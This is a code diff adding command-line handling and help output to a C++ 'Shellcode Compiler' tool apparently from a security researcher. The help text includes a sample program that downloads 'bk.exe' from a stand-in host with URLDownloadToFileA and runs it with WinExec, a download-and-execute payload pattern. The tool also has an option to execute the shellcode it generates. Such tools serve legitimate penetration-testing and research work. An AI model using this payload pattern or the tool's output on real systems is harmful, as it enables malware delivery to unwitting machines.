@@ -10,6 +10,10 @@
 
 using namespace std;
 
+// Program version
+
+#define PROGRAM_VERSION "v0.1 Alpha"
+
 // Special characters
 
 #define CHR_READ_ALPHANUMSTR '\x01'
@@ -1079,16 +1083,137 @@ void CompileAllData(string p_sOutput)
 	}
 }
 
+// Print help
+
+void PrintHelp(string p_sFile)
+{
+	cout << endl;
+	cout << "Shellcode Compiler " << PROGRAM_VERSION << endl;
+	cout << "Ionut Popescu @ SecureWorks" << endl << endl;;
+	cout << "Command line options " << endl;
+	cout << "--------------------" << endl;
+	
+	cout << "\t-h (--help)      : Show this help message" << endl;
+	cout << "\t-v (--verbose)   : Print detailed output" << endl;
+	cout << "\t-t (--test)      : Test (execute) generated shellcode" << endl;
+	cout << "\t-r (--read)      : Read source code file" << endl;
+	cout << "\t-o (--output)    : Output file of the generated binary shellcode" << endl;
+	cout << "\t-a (--assembbly) : Output file of the generated assembly code" << endl << endl;
+
+	cout << "Source code example" << endl;
+	cout << "-------------------" << endl << endl;
+	cout << "\tfunction URLDownloadToFileA(\"urlmon.dll\");" << endl;
+	cout << "\tfunction WinExec(\"kernel32.dll\");" << endl;
+	cout << "\tfunction ExitProcess(\"kernel32.dll\");" << endl << endl;
+	cout << "\tURLDownloadToFileA(0,\"https://site.com/bk.exe\",\"bk.exe\",0,0);" << endl;
+	cout << "\tWinExec(\"bk.exe\",0);" << endl;
+	cout << "\tExitProcess(0);" << endl << endl;
+
+	cout << "Invocation example" << endl;
+	cout << "------------------" << endl;
+	cout << "\t" << p_sFile << " -r Source.txt -o Shellcode.bin -a Assembly.asm" << endl;
+}
+
+// Global variable for command line arguments
+
+bool g_bHelp    = false;
+bool g_bVerbose = false;
+bool g_bTest    = false;
+bool bError     = false;
+
+bool g_bReadFile     = false;
+string g_sReadFile   = "";
+bool g_bOutputFile   = false;
+string g_sOutputFile = "";
+bool g_bASMFile      = false;
+string g_sASMFile    = "";
+
+// Parse command line arguments
+
+void ParseCommandLine(int argc, char *argv[])
+{
+	string CurrentParam;
+	string NextParam;
+
+	// Check arguments
+
+	for (int i = 1; i < argc; i++)
+	{
+		CurrentParam = argv[i];
+		if (i + 1 < argc) NextParam = argv[i + 1];
+		else NextParam = "";
+
+		// Check options
+
+		if (CurrentParam.compare("-h") == 0 || CurrentParam.compare("--help") == 0)         g_bHelp = true;
+		else if (CurrentParam.compare("-v") == 0 || CurrentParam.compare("--verbose") == 0) g_bVerbose = true;
+		else if (CurrentParam.compare("-t") == 0 || CurrentParam.compare("--test") == 0)    g_bTest = true;
+
+		// Arguments that require an option as a second argument
+
+		else if (CurrentParam.compare("-r") == 0 || CurrentParam.compare("--read") == 0)
+		{
+			g_bReadFile = true;
+			if (NextParam.length() > 0) g_sReadFile = NextParam;
+			else
+			{
+				bError = true;
+				cout << endl << "Missing required value for -r argument" << endl;
+			}
+		}
+		else if (CurrentParam.compare("-o") == 0 || CurrentParam.compare("--output") == 0)
+		{
+			g_bOutputFile = true;
+			if (NextParam.length() > 0) g_sOutputFile = NextParam;
+			else
+			{
+				bError = true;
+				cout << endl << "Missing required value for -o argument" << endl;
+			}
+		}
+		else if (CurrentParam.compare("-a") == 0 || CurrentParam.compare("--assembly") == 0)
+		{
+			g_bASMFile = true;
+			if (NextParam.length() > 0) g_sASMFile = NextParam;
+			else
+			{
+				bError = true;
+				cout << endl << "Missing required value for -a argument" << endl;
+			}
+		}
+	}
+
+	// Check for errors
+
+	if (bError == true)
+	{
+		cout << "Cannot compile, check command line arguments!" << endl;
+		return;
+	}
+}
+
 // Main
 
-int main()
+int main(int argc, char *argv[])
 {
+	// If there is no argument, print help
+
+	if (argc == 1)
+	{
+		PrintHelp(argv[0]);
+		return 0;
+	}
+	
 	InitDLLBase();
 	CreateDeclareFunctionsStates();
 	CreateCallFunctionsStates();
 
-	ParseFile(ReadSourceFile("C:\\Users\\Ionut\\Desktop\\SC1.txt"));
-	CompileAllData("C:\\Users\\Ionut\\Desktop\\Outpit.asm");
+	// Parse command line arguments
+
+	ParseCommandLine(argc, argv);
+
+	//ParseFile(ReadSourceFile("C:\\Users\\Ionut\\Desktop\\SC1.txt"));
+	//CompileAllData("C:\\Users\\Ionut\\Desktop\\Output.asm");
 
 	int x;
 	cin >> x;
